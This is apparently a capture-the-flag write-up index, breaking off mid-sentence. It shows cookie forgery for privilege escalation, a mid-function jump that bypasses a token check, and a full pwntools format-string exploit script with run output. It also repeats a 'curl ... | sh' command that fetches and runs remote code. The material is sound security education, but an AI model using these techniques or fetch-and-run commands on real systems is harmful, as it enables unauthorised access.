</ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#forge-santa-cookies","title":"Forge Santa Cookies","text":"<p>Target:</p> <pre><code>internal.user = 1\n</code></pre> <p>Then cookies:</p> <pre><code>cookie_value = 1^0x37\n</code></pre> <p>Count:</p> <pre><code>1^0x37\n</code></pre> <p>Output:</p> <pre><code>54 (decimal)\n</code></pre> <p>Convert to encoded token as base64(XOR bytes):</p> <pre><code>const santaId = \"1\";\nlet xored = \"\";\nfor (let i = 0; i &lt; santaId.length; i++) {\nxored += String.fromCharCode(santaId.charCodeAt(i) ^ 0x37);\n}\nbtoa(xored);\n</code></pre> <p>Output:</p> <pre><code>\"Bg==\"\n</code></pre> <p>URL encode:</p> <pre><code>encodeURIComponent(\"Bg==\")\n</code></pre> <p>Output:</p> <pre><code>\"Bg%3D%3D\"\n</code></pre> <p>So legitimate Santa cookies are:</p> <pre><code>auth=Bg%3D%3D\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#set-cookie-execute-attack","title":"Set Cookie &amp; Execute Attack","text":"<p>On Console:</p> <pre><code>document.cookie = \"auth=\" + encodeURIComponent(\"Bg==\") + \"; path=/;\";\n</code></pre> <ul> <li>Reload page</li> <li>Click \"Order Now\"</li> <li>Network flow:</li> <li><code>POST /create-order</code></li> <li>URL callbacks</li> <li><code>POST /finalize</code></li> </ul> <p>A popup appears:</p> <p>Welcome, Santa! Allowing priority finalize... </p> <p>This means the backend believes we are Santa.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_5_Kramazon/#extract-the-flag","title":"Extract the Flag","text":"<p>In <code>/finalize</code>, Response JSON:</p> <pre><code>{\n\"success\": true,\n\"privileged\": true,\n\"message\": \"Order finalized with Santa-level priority!\",\n\"internal_route\": \"/priority/manifest/route-2025-SANTA.txt\",\n\"flag_hint\": \"flag{npld_async_cookie_\"\n}\n</code></pre> <p>Accessing file:</p> <pre><code>&lt;https://kramazon.csd.lol/priority/manifest/route-2025-SANTA.txt&gt;\n</code></pre> <p>Inside is the full flag:</p> <p></p> <p>csd{npld_async_callback_idor_mastery}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/","title":"KDNU-3B","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#day-6-kdnu-3b","title":"day 6 KDNU-3B","text":"<p>category : binary exploit</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#challenge-overview","title":"Challenge Overview","text":"<p>A drone firmware debug console is provided over a TCP connection.</p> <p>The task is to analyze and exploit the firmware to find hidden Indicators of Compromise (IoC).</p> <p>This challenge simulates:</p> <ul> <li>insecure debug interface</li> <li>firmware function pointer misuse</li> <li>authentication / token check bypass</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#initial-access","title":"Initial Access","text":"<p>Connection to the service is made using netcat:</p> <pre><code>nc ctf.csd.lol 1001\n</code></pre> <p>Server requests Proof of Work (PoW):</p> <pre><code>proof of work:\ncurl -sSfL &lt;https://pwn.red/pow&gt; | sh -s s.AAAAAw==.p/pJbNCn1n/dOan+/90J9A==\n</code></pre> <p>The command is executed locally:</p> <pre><code>curl -sSfL &lt;https://pwn.red/pow&gt; | sh -s s.AAAAAw==.p/pJbNCn1n/dOan+/90J9A==\n</code></pre> <p>The result is a solution token, which is then sent back to the server.</p> <p>If valid, the server opens access to:</p> <pre><code>DRONE FIRMWARE DEBUG CONSOLE&gt;\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#vulnerability-analysis","title":"Vulnerability Analysis","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#debug-console-behavior","title":"Debug Console Behavior","text":"<p>The console only accepts hexadecimal input:</p> <pre><code>DRONE FIRMWARE DEBUG CONSOLE&gt; 401955\n</code></pre> <p>From binary analysis, the program's behavior is equivalent to the following pseudo-code:</p> <pre><code>long fn_ptr;\nscanf(\"%lx\", &amp;fn_ptr);\n((void(*)())fn_ptr)();\n</code></pre> <p>Critical vulnerability:</p> <p>User input is directly used as a function pointer without validation.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#firmware-function-discovery","title":"Firmware Function Discovery","text":"<p>Through static analysis, an important function was discovered called:</p> <pre><code>nav_core()\n</code></pre> <p>This function:</p> <ul> <li>checks the navigation token</li> <li>if valid, reads the firmware manifest file</li> <li>if not, denies access</li> </ul> <p>Starting function:</p> <pre><code>if (!valid_token) {\nputs(\"Invalid navigation token.\");\nreturn;\n}\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#failed-attempt-expected-behavior","title":"Failed Attempt (Expected Behavior)","text":"<p>Calling the function from the beginning:</p> <pre><code>DRONE FIRMWARE DEBUG CONSOLE&gt; 401955\nInvalid navigation token.\n</code></pre> <p>This means the token has not been set, so the function stops.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#exploitation-strategy","title":"Exploitation Strategy","text":"<p>Instead of calling <code>nav_core()</code> from the beginning, we jump to the middle of the function, right after the token check.</p> <p>Target address:</p> <pre><code>0x401989\n</code></pre> <p>This address is located in the section of code that:</p> <ul> <li>opens the <code>manifest</code> file</li> <li>reads its contents</li> <li>prints to STDOUT</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#successful-exploit","title":"Successful Exploit","text":"<p>Console input:</p> <pre><code>DRONE FIRMWARE DEBUG CONSOLE&gt; 401989\n</code></pre> <p>The server responds with the contents of the firmware manifest:</p> <pre><code>KDNU3B-MANIFEST\nformat_version=2\nfw_family=KDNU-DRONE-NAV\nfw_id=kdnu3b-nav-autopilot\nfw_version=1.7.24\nbuild_branch=krampus-prod\nbuild_id=2024-12-01T23:41:09Z\nsigning_key_id=NP-HSM-KEY-07\nregion_lock=GLOBAL\nmin_bootloader=0x00020005\nimage_offset=0x00004000\nimage_size=00036F80\nhash_algo=sha256\nimage_hash=5f4c3f7d8f0b2737c0f5fd8e8da41c6b9e1372cbe9c6760e5d8e9e4f3d7c9b21\ntelemetry_profile=KDNU3B-TM-v4\ncalibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}\nfailsafe_mode=HARD_LOCKDOWN\ndebug_build=false\nsecure_boot=true\nseal_status=SEALED\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_6_KDNU-3B/#flag","title":"Flag","text":"<pre><code>csd{3Asy_F1rmWAr3_HACk1N9_Fr}\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads]\n\u2514\u2500$ nc ctf.csd.lol 1001\n\nproof of work:\ncurl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.p/pJbNCn1n/dOan+/90J9A==\nsolution: s.CA8ORJ6nocSbxX4cr5zUnEFvxt3LGcZQWLjiw1I5eC154K4zRjuMYFKv2Gn1sHQyIDmMIv5teXjrex18p8G3tPglquNEiA6SBOOr4yM6gPzvvcxGQvx/O5I9FeSjlni4CSOhwhFDttFbXxCLLrAnx8R8rztJNS4LXiH/cvjl+mO4oxum/ALapGB/WeAz/njyDXZK8iTJpULNx0ZhwZf/Cw==\nDRONE FIRMWARE DEBUG CONSOLE&gt; 401989\nKDNU3B-MANIFEST\nformat_version=2\nfw_family=KDNU-DRONE-NAV\nfw_id=kdnu3b-nav-autopilot\nfw_version=1.7.24\nbuild_branch=krampus-prod\nbuild_id=2024-12-01T23:41:09Z\nsigning_key_id=NP-HSM-KEY-07\nregion_lock=GLOBAL\nmin_bootloader=0x00020005\nimage_offset=0x00004000\nimage_size=00036F80\nhash_algo=sha256\nimage_hash=5f4c3f7d8f0b2737c0f5fd8e8da41c6b9e1372cbe9c6760e5d8e9e4f3d7c9b21\ntelemetry_profile=KDNU3B-TM-v4\ncalibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}\nfailsafe_mode=HARD_LOCKDOWN\ndebug_build=false\nsecure_boot=true\nseal_status=SEALED\n</code></pre> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/","title":"Failed exfil","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#day-7-failed-exfill","title":"day 7 Failed Exfill","text":"<p>category : Binary exploitation</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#description","title":"Description","text":"<p>The KRAMPUS Syndicate has been using a small remote endpoint they quietly dropped on compromised NPLD machines. When they gain access to a system, they connect to this endpoint and forward whatever \u201cprecious data\u201d they\u2019ve collected back to their infrastructure.</p> <p>During forensics analysis of the machines, analysts discovered the endpoint and later found a screenshot from a dark web forum where a Syndicate member bragged about their exfiltration method which for some reason included a copy of the server binary itself.</p> <p>You\u2019ve been given the screenshot and access to the live endpoint. See if you can identify a flaw in their server and extract the data they assumed was hidden.</p> <p>Live endpoint:\u00a0<code>nc ctf.csd.lol 7777</code></p> <p>This challenge's remote instance utilizes a proof-of-work verification system to prevent brute forcing and from other bad actors.</p> <p>After connecting to the remote instance using\u00a0<code>nc</code>, you must complete a proof-of-work challenge by running the command given and entering the output as the solution.</p> <p>If you are on Windows, please download the\u00a0solver\u00a0manually (named\u00a0<code>redpwnpow-windows-amd64.exe</code>) and run it yourself, like this in PowerShell:</p> <pre><code># 'challenge' is given after connecting to nc\n# (the part after '-s')\n.\\redpwnpow-windows-amd64.exe &lt;challenge&gt;\n</code></pre> <p>In any case, please review the\u00a0auto-download script\u00a0and\u00a0solver\u00a0yourself before running untrusted code on your computer. For more protection, we recommend completing the challenge in a sandboxed environment, such as a virtual machine.</p> <p>If you have any questions or concerns about this technology, please open a ticket in our\u00a0Discord server.</p> <p>hint:</p> <p>Your format string output is giving you more than you actually need. The leak is a full 64-bit stack value, but the secret the admin function checks is only a 32-bit number. Think carefully about how those two sizes line up in memory on a 64-bit system. The part you want is already inside the value you leaked.</p> <p>*When you leak a pointer using\u00a0<code>%p</code>, you are really printing eight bytes pulled straight from the stack. The secret code sits inside those eight bytes, just not in the position you might expect. Try isolating the upper four bytes of the leaked value, interpret them as a standalone integer, then convert them to decimal. Tools like\u00a0*CyberChef\u00a0make this extraction extremely simple.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#challenge-story","title":"Challenge Story","text":"<p>The KRAMPUS Syndicate left an \"exfiltration endpoint\" on the victim's machine. This endpoint received the stolen data and then sent it back to their server.</p> <p>The researcher found a copy of the server binary (<code>collector</code>). From that binary, we had to find the bug and how to read the stolen secret. The remote system uses Proof-of-Work to prevent brute force attacks.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#local-analysis-binary-inspection","title":"Local Analysis - Binary Inspection","text":"<p>We found the file:</p> <pre><code>collector: ELF 64-bit, x86-64, dynamically linked, no PIE\n</code></pre> <p>Checksec:</p> <pre><code>Partial RELRO\nNo stack canary\nNX enabled\nNo PIE\n</code></pre> <p>No ASLR at the executable offset, but the remote server has normal ASLR.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#strings-architecture","title":"Strings &amp; Architecture","text":"<p>When executed locally:</p> <pre><code>./collector\nIf you see this on remote, contact admin\n</code></pre> <p>The program does not reveal behavior. Need to reverse.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#reverse-engineering-ghidra","title":"Reverse Engineering (Ghidra)","text":"<p>Important functions:</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#handle_write-vulnerability","title":"<code>handle_write</code> Vulnerability","text":"<pre><code>void handle_write(void)\n{\nprintf(\"data: \");\nfgets(collected_data, 0x400, stdin);\nputs(\"ok\");\n}\n</code></pre> <p>Writes user input to the global <code>collected_data</code> buffer.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#handle_read-format-string-bug","title":"<code>handle_read</code> Format String Bug","text":"<pre><code>void handle_read(void)\n{\nputs(\"data:\");\nprintf(collected_data);\n}\n</code></pre> <p>\u2757 BUG: <code>printf(collected_data)</code> without a format specifier \u2192 FORMAT STRING VULNERABILITY.</p> <p>This means that if <code>collected_data</code> contains <code>%p %p %p ...</code>, printf will read the value from the stack and print the pointer/word there.</p> <p>This allows an arbitrary read of the data on the stack.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#handle_admin-secret-check","title":"<code>handle_admin</code> Secret Check","text":"<pre><code>void handle_admin(int param_1)\n{\nchar local_buf[0x118];\nfgets(local_buf, 0x100, stdin);\nlocal_c = (int)strtoul(local_buf, 0, 10);\nif(local_c == param_1){\nputs(metadata);\n} else {\nputs(\"denied\");\n}\n}\n</code></pre> <p>The parameter <code>param_1</code> is 32-bit secret. If we enter the value true \u2192 server print <code>metadata</code>, which contains flags.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#exploit-flow","title":"Exploit Flow","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#program-workflow","title":"Program Workflow","text":"<pre><code>cmd:\nwrite \u2192 user sends payload \u2192 saved into collected_data\nread \u2192 print collected_data using printf(collected_data)\nadmin \u2192 user enters 32-bit secret number\n</code></pre> <p>So we do:</p> <ol> <li><code>write</code> \u2192 <code>%p %p %p %p %p ...</code></li> <li><code>read</code> \u2192 leak multiple pointers</li> <li>Analyze one of the pointers that contains the secret</li> <li><code>admin</code> \u2192 send secret \u2192 flag exit</li> </ol>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#real-challenge-extracting-the-secret","title":"Real Challenge: Extracting the Secret","text":"<p>Hint from the organizer:</p> <p>You've leaked a 64-bit stack value, but the secret is only 32-bit. Think about how 64-bit memory layout works. The upper 4 bytes of the pointer already contain the secret you're looking for. </p> <p>This is the primary key.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#memory-layout-explanation-very-important","title":"Memory Layout Explanation (Very Important)","text":"<p>x86-64 (little-endian)** architecture:</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#64-bit-pointer-memory-layout","title":"64-bit pointer \u2192 memory layout:","text":"<p>Memory (low \u2192 high):</p> <pre><code>[ lower 4 bytes ][ upper 4 bytes ]\n</code></pre> <ul> <li>print <code>%p</code> \u2192 display in big-endian hex string format</li> </ul> <p>example: pointer in RAM:</p> <pre><code>E8 79 DD D5 52 2E 0F 50\n</code></pre> <p>Displayed as:</p> <pre><code>0x500f2e52d5dd79e8\n</code></pre> <p>Separate four bytes:</p> <pre><code>upper 4 bytes: 0x500f2e52\nlower 4 bytes: 0xd5dd79e8\n</code></pre> <p>Secret = upper 4 bytes interpreted as unsigned int</p> <p>Because:</p> <ul> <li>secret is used as a int (32-bit), and stored on the stack,</li> <li>when the stack is used and the pointer is printed, the secret \"goes\" to the register/stack frame near the pointer we printed,</li> <li>so that number can appear as part of a pointer leak.</li> </ul>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#why-upper-not-lower","title":"Why upper, not lower?","text":"<p>Stack memory overlapping:</p> <pre><code>+-------------------+\n| return addr |\n| saved rbp |\n| local variables |\n| .... |\n| int secret (4B) |\n| padding (4B) |\n+-------------------+\n</code></pre> <p>When <code>%p</code> reads 8 bytes from a position on the stack:</p> <pre><code>[ secret 4B ][ padding/some data 4B ]\n</code></pre> <p>The printed 8 bytes are interpreted as a pointer, but the first 4 bytes are actually the secret.</p> <p>And this still appears even if the server uses ASLR.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#live-exploitation-using-automation","title":"Live Exploitation Using Automation","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#step-1-connect","title":"Step 1: Connect","text":"<pre><code>nc ctf.csd.lol 7777\n</code></pre> <p>Server gives PoW:</p> <pre><code>Proof of work:\ncurl -sSfL &lt;https://pwn.red/pow&gt; | sh -s &lt;challenge&gt;\n</code></pre> <p>Solver gives <code>solution:</code> \u2192 we send it back.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/#step-2-leak-string-format","title":"Step 2: Leak String Format","text":"<p>Command sequence:</p> <pre><code>cmd: write\ndata: %p %p %p %p %p %p %p %p %p %p %p\nOK\ncmd: read\ndata:\n0x7f81d332f643 (nil) ...\n</code></pre> <p>Real run output that finds the flag:</p> <pre><code>0x500f2e52d5dd79e8\n</code></pre> <p>Now separate:</p> <pre><code>upper 32-bit = 0x500f2e52 \u2192 1343172178 decimal\nlower 32-bit = 0xd5dd79e8 \u2192 3588061672 decimal\n</code></pre> <p>Test into <code>admin:</code>:</p> <pre><code>cmd: admin\nauth: 1343172178\n</code></pre> <p>Server returns:</p> <pre><code># KRAMPUS SYNDICATE EXFIL v1.4\n...\nrotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}\n</code></pre> <p>exploit script</p> <pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport subprocess\nimport re\n\nHOST, PORT = \"ctf.csd.lol\", 7777\ncontext.log_level = \"info\"\n\ndef solve_pow(pow_cmd: str) -&gt; str:\n    log.info(f\"Running PoW: {pow_cmd}\")\n    res = subprocess.run(pow_cmd, shell=True, capture_output=True, text=True)\n    out = res.stdout.strip()\n    for line in out.splitlines():\n        if line.startswith(\"solution:\"):\n            sol = line.split(\":\", 1)[1].strip()\n            log.success(f\"PoW solution: {sol}\")\n            return sol\n    # Fallback: entire output is the solution\n    log.success(f\"PoW solution (fallback): {out}\")\n    return out\n\ndef split_upper_lower(ptr: str):\n    h = ptr[2:].rjust(16, \"0\")\n    upper_hex, lower_hex = h[:8], h[8:]\n    return h, upper_hex, int(upper_hex, 16), lower_hex, int(lower_hex, 16)\n\ndef main():\n    r = remote(HOST, PORT)\n\n    # --- Proof of Work ---\n    r.recvuntil(b\"proof of work:\\n\")\n    pow_cmd = r.recvline().decode().strip()\n    log.info(f\"PoW cmd: {pow_cmd}\")\n    r.recvuntil(b\"solution:\")\n    sol = solve_pow(pow_cmd)\n    r.sendline(sol.encode())\n    r.recvuntil(b\"cmd:\")\n\n    # --- Leak pointers ---\n    r.sendline(b\"write\")\n    r.recvuntil(b\"data:\")\n    r.sendline(b\"%p \" * 16)\n    r.recvuntil(b\"ok\")\n    r.recvuntil(b\"cmd:\")\n\n    r.sendline(b\"read\")\n    out = r.recvuntil(b\"cmd:\").decode(errors=\"ignore\")\n    leak_line = next((line for line in out.splitlines() if \"0x\" in line), None)\n    if not leak_line:\n        log.error(\"No leak found\")\n        return\n\n    ptrs = re.findall(r\"0x[0-9a-fA-F]+\", leak_line)\n    if not ptrs:\n        log.error(\"No pointers parsed\")\n        return\n\n    print(\"\\n[+] Leaked pointers:\")\n    for i, p in enumerate(ptrs):\n        print(f\" idx {i}: {p}\")\n\n    # --- Build candidates ---\n    candidates = []\n    print(\"\\n[+] Derived candidates:\")\n    print(\"idx | pointer          | upper_hex | upper_dec | lower_hex | lower_dec\")\n    print(\"----+------------------+-----------+-----------+-----------+----------\")\n    for idx, p in enumerate(ptrs):\n        full_h, up_h, up_d, lo_h, lo_d = split_upper_lower(p)\n        print(f\"{idx:3} | {p:16} | {up_h:9} | {up_d:9} | {lo_h:9} | {lo_d:9}\")\n        candidates.append((f\"idx{idx}-upper({up_h})\", up_d))\n        candidates.append((f\"idx{idx}-lower({lo_h})\", lo_d))\n\n    # --- Try candidates ---\n    for desc, val in candidates:\n        log.info(f\"Trying {desc} = {val}\")\n        try:\n            r.sendline(b\"admin\")\n            r.recvuntil(b\"auth:\")\n            r.sendline(str(val).encode())\n            resp = r.recvuntil(b\"cmd:\", timeout=3).decode(errors=\"ignore\")\n        except EOFError:\n            log.warning(\"Connection closed during attempt\")\n            break\n\n        log.info(f\"Response for {desc}:\\n{resp}\")\n        if \"denied\" not in resp.lower():\n            print(\"\\n====== SUCCESS? ======\")\n            print(f\"Candidate: {desc}\")\n            print(f\"Value    : {val}\")\n            print(\"Full response:\")\n            print(resp)\n            break\n\n    r.close()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudent]\n\u2514\u2500$ python3 failed-exfil.py \n\n[\u25e2] Opening connection to ctf.csd.lol on port 7777: Trying 52.204.1[+] Opening connection to ctf.csd.lol on port 7777: Done\n[*] PoW cmd line: curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==\n[*] Running PoW: curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==\n[+] PoW solution (fallback): s.YJfar2Mrb6wM0YjbNvjmYDmH36zdVzQaWhOIr2LsGwLNUqtCvG3GeY3sP/8/dSB6DEvJwVg1in1wyU1LfwxU2hFedoe799nGs9TQwx06vsK9s9UnSzYANXwOARTPkOmPrZ9IJl5Pv13Nlb2UmELfPnN3jS5dxjXjXsiIWFeHC6IrjaS6kOsyKo6JCXY38fzKNcLijRGAm2rUu9lvcFRHyA==\n[*] Raw read output:\n     data:\n    0x7f81d332f643 (nil) 0x7f81d32475a4 0x5 (nil) 0x7ffed5dd78c0 0x40159a 0xa64616572 (nil) (nil) 0x7f81d3361af0 0x7ffed5dd79a0 0x500f2e52d5dd79e8 0x7ffed5dd7960 0x7f81d31551ca 0x7ffed5dd7910 \n    cmd:\n[*] Leak line: 0x7f81d332f643 (nil) 0x7f81d32475a4 0x5 (nil) 0x7ffed5dd78c0 0x40159a 0xa64616572 (nil) (nil) 0x7f81d3361af0 0x7ffed5dd79a0 0x500f2e52d5dd79e8 0x7ffed5dd7960 0x7f81d31551ca 0x7ffed5dd7910\n\n[+] Pointers leaked:\n  idx 0: 0x7f81d332f643\n  idx 1: 0x7f81d32475a4\n  idx 2: 0x5\n  idx 3: 0x7ffed5dd78c0\n  idx 4: 0x40159a\n  idx 5: 0xa64616572\n  idx 6: 0x7f81d3361af0\n  idx 7: 0x7ffed5dd79a0\n  idx 8: 0x500f2e52d5dd79e8\n  idx 9: 0x7ffed5dd7960\n  idx 10: 0x7f81d31551ca\n  idx 11: 0x7ffed5dd7910\n\n[+] Derived candidates (from each %p):\nidx | pointer           | 64-bit hex      | upper_hex | upper_dec | lower_hex | lower_dec\n----+-------------------+-----------------+-----------+-----------+-----------+----------\n  0 | 0x7f81d332f643    | 00007f81d332f643 | 00007f81  |     32641 | d332f643  | 3543332419\n  1 | 0x7f81d32475a4    | 00007f81d32475a4 | 00007f81  |     32641 | d32475a4  | 3542381988\n  2 | 0x5               | 0000000000000005 | 00000000  |         0 | 00000005  |         5\n  3 | 0x7ffed5dd78c0    | 00007ffed5dd78c0 | 00007ffe  |     32766 | d5dd78c0  | 3588061376\n  4 | 0x40159a          | 000000000040159a | 00000000  |         0 | 0040159a  |   4199834\n  5 | 0xa64616572       | 0000000a64616572 | 0000000a  |        10 | 64616572  | 1684104562\n  6 | 0x7f81d3361af0    | 00007f81d3361af0 | 00007f81  |     32641 | d3361af0  | 3543538416\n  7 | 0x7ffed5dd79a0    | 00007ffed5dd79a0 | 00007ffe  |     32766 | d5dd79a0  | 3588061600\n  8 | 0x500f2e52d5dd79e8 | 500f2e52d5dd79e8 | 500f2e52  | 1343172178 | d5dd79e8  | 3588061672\n  9 | 0x7ffed5dd7960    | 00007ffed5dd7960 | 00007ffe  |     32766 | d5dd7960  | 3588061536\n 10 | 0x7f81d31551ca    | 00007f81d31551ca | 00007f81  |     32641 | d31551ca  | 3541389770\n 11 | 0x7ffed5dd7910    | 00007ffed5dd7910 | 00007ffe  |     32766 | d5dd7910  | 3588061456\n[*] Trying candidate idx0-upper(00007f81) = 32641\n[*] Response for idx0-upper(00007f81):\n     denied\n    cmd:\n[*] Trying candidate idx0-lower(d332f643) = 3543332419\n[*] Response for idx0-lower(d332f643):\n     denied\n    cmd:\n[*] Trying candidate idx1-upper(00007f81) = 32641\n[*] Response for idx1-upper(00007f81):\n     denied\n    cmd:\n[*] Trying candidate idx1-lower(d32475a4) = 3542381988\n[*] Response for idx1-lower(d32475a4):\n     denied\n    cmd:\n[*] Trying candidate idx2-upper(00000000) = 0\n[*] Response for idx2-upper(00000000):\n     denied\n    cmd:\n[*] Trying candidate idx2-lower(00000005) = 5\n[*] Response for idx2-lower(00000005):\n     denied\n    cmd:\n[*] Trying candidate idx3-upper(00007ffe) = 32766\n[*] Response for idx3-upper(00007ffe):\n     denied\n    cmd:\n[*] Trying candidate idx3-lower(d5dd78c0) = 3588061376\n[*] Response for idx3-lower(d5dd78c0):\n     denied\n    cmd:\n[*] Trying candidate idx4-upper(00000000) = 0\n[*] Response for idx4-upper(00000000):\n     denied\n    cmd:\n[*] Trying candidate idx4-lower(0040159a) = 4199834\n[*] Response for idx4-lower(0040159a):\n     denied\n    cmd:\n[*] Trying candidate idx5-upper(0000000a) = 10\n[*] Response for idx5-upper(0000000a):\n     denied\n    cmd:\n[*] Trying candidate idx5-lower(64616572) = 1684104562\n[*] Response for idx5-lower(64616572):\n     denied\n    cmd:\n[*] Trying candidate idx6-upper(00007f81) = 32641\n[*] Response for idx6-upper(00007f81):\n     denied\n    cmd:\n[*] Trying candidate idx6-lower(d3361af0) = 3543538416\n[*] Response for idx6-lower(d3361af0):\n     denied\n    cmd:\n[*] Trying candidate idx7-upper(00007ffe) = 32766\n[*] Response for idx7-upper(00007ffe):\n     denied\n    cmd:\n[*] Trying candidate idx7-lower(d5dd79a0) = 3588061600\n[*] Response for idx7-lower(d5dd79a0):\n     denied\n    cmd:\n[*] Trying candidate idx8-upper(500f2e52) = 1343172178\n[*] Response for idx8-upper(500f2e52):\n     # KRAMPUS SYNDICATE EXFIL v1.4\n    node_id: krps-ops-node12\n    channel: steady\n    auth_token: a94f210033bb91ef2201df009ab1\n    rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}\n    last_sync: 2025-11-29T02:11Z\n    checksum: 4be2f1aa\n\n    cmd:\n\n====== POSSIBLE SUCCESS ======\nCandidate : idx8-upper(500f2e52)\nValue     : 1343172178\nFull response:\n # KRAMPUS SYNDICATE EXFIL v1.4\nnode_id: krps-ops-node12\nchannel: steady\nauth_token: a94f210033bb91ef2201df009ab1\nrotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}\nlast_sync: 2025-11-29T02:11Z\nchecksum: 4be2f1aa\n\ncmd:\n[*] Closed connection to ctf.csd.lol port 7777\n</code></pre> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/","title":"Log Folly","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#day-7-log-folly","title":"day 7 Log Folly","text":"<p>category : cryptography</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#description","title":"Description","text":"<p>A quiet morning never lasts long at North Pole Security. Your console lights up with a new message from Jingle McSnark.\u00a0He writes:</p> <p>\u201cSince you somehow solved my last challenge I made something actually secure this time. True discrete log strength. Unbreakable. And I even rotate the secret every round so you cannot rely on patterns. This is real cryptography human.\u201d </p> <p>The attachment is a small script and a long list of leaks.\u00a0Snowdrift walks by, sees the file, and whispers</p> <p>\u201cHe still keeps exponentiating the wrong thing\u201d </p> <p>You open the file.\u00a0It takes about three seconds to realize Jingle has once again misunderstood what makes discrete log hard.\u00a0Recover the hidden message before he starts bragging to the whole SOC.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#attachments","title":"Attachments","text":"<p>**chall.pyout.txt**</p> <p>chall.py</p> <p>out.txt</p> <p>clue:</p> <p>Two leaks combined the right way is better than one. *Look for\u00a0*arithmetic relations\u00a0between rotated flags.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#1-challenge-overview","title":"1. Challenge Overview","text":"<p>We are given a script that:</p> <ul> <li>Generates a 256-bit prime <code>p</code> and uses generator <code>g = 2</code></li> <li>Converts the current FLAG string to integer <code>x = bytes_to_long(FLAG)</code></li> <li>Prints <code>leak = 2^x mod p</code></li> <li>Rotates the FLAG by 1 byte per round</li> </ul> <p>The output file contains every cyclic rotation of the flag encoded as exponentiations of 2.</p> <p>Despite claims of \u201ctrue discrete log strength,\u201d this design is cryptographically broken because the exponential structure leaks linear relationships between rotations.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#2-how-the-flag-is-processed","title":"2. How the FLAG Is Processed","text":"<p>Let the flag bytes be:</p> <p>[b0, b1, b2, \u2026, b(n\u22121)]</p> <p>Round 0:</p> <ul> <li>x0 = bytes_to_long([b0, b1, \u2026, b(n\u22121)])</li> <li>leak0 = 2^x0 mod p</li> </ul> <p>Round 1:</p> <ul> <li>FLAG rotated left \u2192 [b1, b2, \u2026, b(n\u22121), b0]</li> <li>x1 = bytes_to_long(rotated FLAG)</li> <li>leak1 = 2^x1 mod p</li> </ul> <p>Continuing this process gives a sequence of leaks representing all cyclic rotations.</p> <p>This introduces exploitable algebraic 